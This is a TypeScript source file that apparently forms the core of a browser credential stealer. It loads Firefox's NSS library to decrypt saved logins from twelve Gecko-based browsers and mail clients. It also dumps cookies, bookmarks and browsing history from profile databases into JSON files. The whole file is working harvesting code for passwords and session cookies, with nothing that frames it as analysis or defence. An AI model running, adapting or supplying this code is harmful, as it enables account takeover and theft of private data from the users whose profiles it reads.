// GeckoDecryptor.ts
import * as fs from 'fs';
import * as path from 'path';
import * as ffi from 'ffi-napi';
import * as ref from 'ref-napi';
import * as sqlite3 from 'sqlite3';
import { Database } from 'sqlite3';
import * as util from 'util';

// Types for NSS structures
const SECItemType = {
  siBuffer: 0,
  siClearDataBuffer: 1,
  siCipherDataBuffer: 2,
  siDERCertBuffer: 3,
  siEncodedCertBuffer: 4,
  siDERNameBuffer: 5,
  siEncodedNameBuffer: 6,
  siAsciiNameString: 7,
  siAsciiString: 8,
  siDEROID: 9
};

// Interface for data storage
interface PasswordData {
  url: string;
  username: string;
  password: string;
  host: string;
}

interface CookieData {
  url: string;
  host: string;
  name: string;
  value: string;
  expiry: string;
}

interface BookmarkData {
  url: string;
  host: string;
  name: string;
  dateAdded: string;
}

interface HistoryData {
  url: string;
  host: string;
  title: string;
  lastVisitTime: string;
  visitCount: string;
}

class DataHolder {
  private passwordManager: {
    url: string;
    username: string;
    password: string;
    host: string;
  };

  private cookiesManager: {
    url: string;
    host: string;
    name: string;
    value: string;
    expiry: string;
  };

  private bookmarksManager: {
    url: string;
    host: string;
    name: string;
    dateAdded: string;
  };

  private historyManager: {
    url: string;
    host: string;
    title: string;
    lastVisitTime: string;
    visitCount: string;
  };

  constructor() {
    this.passwordManager = { url: '', username: '', password: '', host: '' };
    this.cookiesManager = { url: '', host: '', name: '', value: '', expiry: '' };
    this.bookmarksManager = { url: '', host: '', name: '', dateAdded: '' };
    this.historyManager = { url: '', host: '', title: '', lastVisitTime: '', visitCount: '' };
  }

  get_password_manager() {
    return this.passwordManager;
  }

  get_cookies_manager() {
    return this.cookiesManager;
  }

  get_bookmarks_manager() {
    return this.bookmarksManager;
  }

  get_history_manager() {
    return this.historyManager;
  }
}

// GeckoDecryptor class
class GeckoDecryptor {
  private mozGlueLib: any = null;
  private nss3Lib: any = null;
  private nssInit: any = null;
  private pk11SdrDecrypt: any = null;
  private nssShutdown: any = null;

  constructor() {}

  destroy(): void {
    if (this.nssShutdown) {
      this.nssShutdown();
    }
    
    // In Node.js with ffi-napi, we don't need to explicitly free libraries
    this.mozGlueLib = null;
    this.nss3Lib = null;
  }

  geckoDecryptorInit(targetMozillaBrowser: string): boolean {
    try {
      const mozglueDllPath = path.join(targetMozillaBrowser, 'mozglue.dll');
      const nss3DllPath = path.join(targetMozillaBrowser, 'nss3.dll');

      if (!fs.existsSync(mozglueDllPath) || !fs.existsSync(nss3DllPath)) {
        console.log(`Required DLLs not found at ${targetMozillaBrowser}`);
        return false;
      }

      // Define the interface for NSS functions
      this.nss3Lib = ffi.Library(nss3DllPath, {
        'NSS_Init': ['int', ['string']],
        'PK11SDR_Decrypt': ['int', ['pointer', 'pointer', 'pointer']],
        'NSS_Shutdown': ['void', []]
      });

      this.mozGlueLib = ffi.Library(mozglueDllPath, {});

      this.nssInit = this.nss3Lib.NSS_Init;
      this.pk11SdrDecrypt = this.nss3Lib.PK11SDR_Decrypt;
      this.nssShutdown = this.nss3Lib.NSS_Shutdown;

      return true;
    } catch (error) {
      console.error('Error initializing GeckoDecryptor:', error);
      return false;
    }
  }

  setProfileDir(profileDir: string): boolean {
    try {
      const result = this.nssInit(profileDir);
      return result === 0;
    } catch (error) {
      console.error('Error setting profile directory:', error);
      return false;
    }
  }

  decryptData(encryptedData: string): string {
    try {
      const decodedData = this.decodeBase64(encryptedData);
      if (!decodedData) {
        return '';
      }

      const SECItem = this.createSECItemStruct();
      const inBuffer = Buffer.from(decodedData);
      const inItem = new SECItem({ 
        type: SECItemType.siBuffer,
        data: ref.alloc('pointer', inBuffer),
        len: inBuffer.length
      });

      const outItem = new SECItem({ 
        type: SECItemType.siBuffer,
        data: ref.alloc('pointer', Buffer.alloc(0)),
        len: 0
      });

      if (this.pk11SdrDecrypt(inItem.ref(), outItem.ref(), null) !== 0) {
        return '';
      }

      const outLength = outItem.len;
      const outDataPtr = outItem.data.deref();
      const decryptedData = ref.reinterpret(outDataPtr, outLength, 0).toString('utf8');

      return decryptedData;
    } catch (error) {
      console.error('Error decrypting data:', error);
      return '';
    }
  }

  private decodeBase64(base64String: string): Buffer | null {
    try {
      return Buffer.from(base64String, 'base64');
    } catch (error) {
      console.error('Error decoding base64:', error);
      return null;
    }
  }

  private createSECItemStruct() {
    return ffi.Struct({
      'type': 'int',
      'data': 'pointer',
      'len': 'int'
    });
  }
}

// GeckoParser functionality
const geckoPaths = 'AppData\\Roaming\\';
const browsersGecko = [
  'Mozilla\\Firefox\\',
  'Thunderbird\\',
  'Mozilla\\SeaMonkey\\',
  'NETGATE Technologies\\BlackHawk\\',
  '8pecxstudios\\Cyberfox\\',
  'K-Meleon\\',
  'Mozilla\\icecat\\',
  'Moonchild Productions\\Pale Moon\\',
  'Comodo\\IceDragon\\',
  'Waterfox\\',
  'Postbox\\',
  'Flock\\Browser\\'
];

// Helper function to query SQLite database
function queryDatabase(dbPath: string, query: string): Promise<any[]> {
  return new Promise((resolve, reject) => {
    const db = new sqlite3.Database(dbPath, sqlite3.OPEN_READONLY, (err) => {
      if (err) {
        return reject(err);
      }

      db.all(query, [], (err, rows) => {
        db.close();
        if (err) {
          return reject(err);
        }
        resolve(rows);
      });
    });
  });
}

async function getGeckoProgramDir(targetUserData: string): Promise<string> {
  try {
    const compatibilityFile = path.join(targetUserData, 'compatibility.ini');
    if (!fs.existsSync(compatibilityFile)) {
      return '';
    }

    const content = fs.readFileSync(compatibilityFile, 'utf8');
    const lines = content.split('\n');
    const key = 'LastPlatformDir=';
    
    for (const line of lines) {
      if (line.startsWith(key)) {
        return line.substring(key.length);
      }
    }

    console.error('LastPlatformDir not found in the file');
    return '';
  } catch (error) {
    console.error('Error reading compatibility.ini:', error);
    return '';
  }
}

// Main functions to extract data
async function geckoParser(username: string, outputPath: string): Promise<boolean> {
  const dataList: DataHolder[] = [];

  for (const dir of browsersGecko) {
    const targetUserData = path.join('C:\\users', username, geckoPaths, dir, 'Profiles');
    
    try {
      if (fs.existsSync(targetUserData) && fs.statSync(targetUserData).isDirectory()) {
        const profileDirs = fs.readdirSync(targetUserData)
          .map(entry => path.join(targetUserData, entry))
          .filter(entry => fs.statSync(entry).isDirectory());
          
        for (const profileDir of profileDirs) {
          const loginsJsonPath = path.join(profileDir, 'logins.json');
          
          if (fs.existsSync(loginsJsonPath)) {
            const loginsData = JSON.parse(fs.readFileSync(loginsJsonPath, 'utf8'));
            
            // Create decryptor object
            const decryptor = new GeckoDecryptor();
            const programDir = await getGeckoProgramDir(profileDir);
            
            if (!programDir || !decryptor.geckoDecryptorInit(programDir)) {
              continue;
            }
            
            if (!decryptor.setProfileDir(profileDir)) {
              continue;
            }
            
            // Loop through all logins
            for (const login of loginsData.logins) {
              const data = new DataHolder();
              
              const hostname = login.hostname;
              let username = login.encryptedUsername;
              let password = login.encryptedPassword;
              
              data.get_password_manager().url = hostname;
              
              username = decryptor.decryptData(username);
              password = decryptor.decryptData(password);
              
              data.get_password_manager().username = username;
              data.get_password_manager().password = password;
              data.get_password_manager().host = dir;
              
              dataList.push(data);
            }
            
            decryptor.destroy();
          }
        }
      }
    } catch (error) {
      console.error(`Error processing directory ${dir}:`, error);
      continue;
    }
  }
  
  if (dataList.length === 0) {
    return false;
  }
  
  // Save password data to output file
  fs.writeFileSync(
    path.join(outputPath, 'gecko_passwords.json'), 
    JSON.stringify(dataList.map(d => d.get_password_manager()), null, 2)
  );
  
  return true;
}

async function geckoCookieCollector(username: string, outputPath: string): Promise<boolean> {
  const dataList: DataHolder[] = [];

  for (const dir of browsersGecko) {
    const targetUserData = path.join('C:\\users', username, geckoPaths, dir, 'Profiles');
    
    try {
      if (fs.existsSync(targetUserData) && fs.statSync(targetUserData).isDirectory()) {
        const profileDirs = fs.readdirSync(targetUserData)
          .map(entry => path.join(targetUserData, entry))
          .filter(entry => fs.statSync(entry).isDirectory());
          
        for (const profileDir of profileDirs) {
          const cookieDbPath = path.join(profileDir, 'cookies.sqlite');
          
          if (fs.existsSync(cookieDbPath)) {
            try {
              const rows = await queryDatabase(
                cookieDbPath,
                "SELECT host, name, path, value, expiry FROM moz_cookies"
              );
              
              for (const row of rows) {
                const data = new DataHolder();
                
                data.get_cookies_manager().url = row.host;
                data.get_cookies_manager().host = dir;
                data.get_cookies_manager().name = row.name;
                data.get_cookies_manager().value = row.value;
                data.get_cookies_manager().expiry = row.expiry.toString();
                
                dataList.push(data);
              }
            } catch (error) {
              console.error(`Error querying cookies database in ${profileDir}:`, error);
              continue;
            }
          }
        }
      }
    } catch (error) {
      console.error(`Error processing directory ${dir}:`, error);
      continue;
    }
  }

  if (dataList.length === 0) {
    return false;
  }
  
  // Save cookie data to output file
  fs.writeFileSync(
    path.join(outputPath, 'gecko_cookies.json'), 
    JSON.stringify(dataList.map(d => d.get_cookies_manager()), null, 2)
  );
  
  return true;
}

async function geckoBookmarksCollector(username: string, outputPath: string): Promise<boolean> {
  const dataList: DataHolder[] = [];

  for (const dir of browsersGecko) {
    const targetUserData = path.join('C:\\users', username, geckoPaths, dir, 'Profiles');
    
    try {
      if (fs.existsSync(targetUserData) && fs.statSync(targetUserData).isDirectory()) {
        const profileDirs = fs.readdirSync(targetUserData)
          .map(entry => path.join(targetUserData, entry))
          .filter(entry => fs.statSync(entry).isDirectory());
          
        for (const profileDir of profileDirs) {
          const placesDbPath = path.join(profileDir, 'places.sqlite');
          
          if (fs.existsSync(placesDbPath)) {
            try {
              const bookmarks = await queryDatabase(
                placesDbPath,
                "SELECT fk, title, dateAdded FROM moz_bookmarks"
              );
              
              for (const bookmark of bookmarks) {
                if (!bookmark.fk || !bookmark.title) {
                  continue;
                }
                
                // Get URL using the foreign key from urls table
                const urlRows = await queryDatabase(
                  placesDbPath,
                  `SELECT url FROM moz_places WHERE id = ${bookmark.fk}`
                );
                
                if (urlRows.length === 0 || !urlRows[0].url) {
                  continue;
                }
                
                const data = new DataHolder();
                data.get_bookmarks_manager().url = urlRows[0].url;
                data.get_bookmarks_manager().host = dir;
                data.get_bookmarks_manager().name = bookmark.title;
                data.get_bookmarks_manager().dateAdded = bookmark.dateAdded.toString();
                
                dataList.push(data);
              }
            } catch (error) {
              console.error(`Error querying bookmarks database in ${profileDir}:`, error);
              continue;
            }
          }
        }
      }
    } catch (error) {
      console.error(`Error processing directory ${dir}:`, error);
      continue;
    }
  }

  if (dataList.length === 0) {
    return false;
  }
  
  // Save bookmarks data to output file
  fs.writeFileSync(
    path.join(outputPath, 'gecko_bookmarks.json'), 
    JSON.stringify(dataList.map(d => d.get_bookmarks_manager()), null, 2)
  );
  
  return true;
}

async function geckoHistoryCollector(username: string, outputPath: string): Promise<boolean> {
  const dataList: DataHolder[] = [];

  for (const dir of browsersGecko) {
    const targetUserData = path.join('C:\\users', username, geckoPaths, dir, 'Profiles');
    
    try {
      if (fs.existsSync(targetUserData) && fs.statSync(targetUserData).isDirectory()) {
        const profileDirs = fs.readdirSync(targetUserData)
          .map(entry => path.join(targetUserData, entry))
          .filter(entry => fs.statSync(entry).isDirectory());
          
        for (const profileDir of profileDirs) {
          const placesDbPath = path.join(profileDir, 'places.sqlite');
          
          if (fs.existsSync(placesDbPath)) {
            try {
              const historyItems = await queryDatabase(
                placesDbPath,
                "SELECT url, title, visit_count, last_visit_date FROM moz_places"
              );
              
              for (const item of historyItems) {
                if (!item.url || !item.title) {
                  continue;
                }
                
                const data = new DataHolder();
                data.get_history_manager().url = item.url;
                data.get_history_manager().host = dir;
                data.get_history_manager().title = item.title;
                data.get_history_manager().lastVisitTime = item.last_visit_date?.toString() || '';
                data.get_history_manager().visitCount = item.visit_count?.toString() || '';
                
                dataList.push(data);
              }
            } catch (error) {
              console.error(`Error querying history database in ${profileDir}:`, error);
              continue;
            }
          }
        }
      }
    } catch (error) {
      console.error(`Error processing directory ${dir}:`, error);
      continue;
    }
  }

  if (dataList.length === 0) {
    return false;
  }
  
  // Save history data to output file
  fs.writeFileSync(
    path.join(outputPath, 'gecko_history.json'), 
    JSON.stringify(dataList.map(d => d.get_history_manager()), null, 2)
  );
  
  return true;
}

// Main function to run all collectors
async function collectAllGeckoData(username: string, outputPath: string): Promise<void> {
  console.log('Starting Gecko data collection...');
  
  // Ensure output directory exists
  if (!fs.existsSync(outputPath)) {
    fs.mkdirSync(outputPath, { recursive: true });
  }
  
  // Run all collectors
  const passwordResult = await geckoParser(username, outputPath);
  console.log(`Password collection ${passwordResult ? 'successful' : 'failed'}`);
  
  const cookieResult = await geckoCookieCollector(username, outputPath);
  console.log(`Cookie collection ${cookieResult ? 'successful' : 'failed'}`);
  
  const bookmarkResult = await geckoBookmarksCollector(username, outputPath);
  console.log(`Bookmark collection ${bookmarkResult ? 'successful' : 'failed'}`);
  
  const historyResult = await geckoHistoryCollector(username, outputPath);
  console.log(`History collection ${historyResult ? 'successful' : 'failed'}`);
  
  console.log('Gecko data collection complete.');
}

// Export the main function
export {
  collectAllGeckoData,
  geckoParser,
  geckoCookieCollector,
  geckoBookmarksCollector,
  geckoHistoryCollector
};
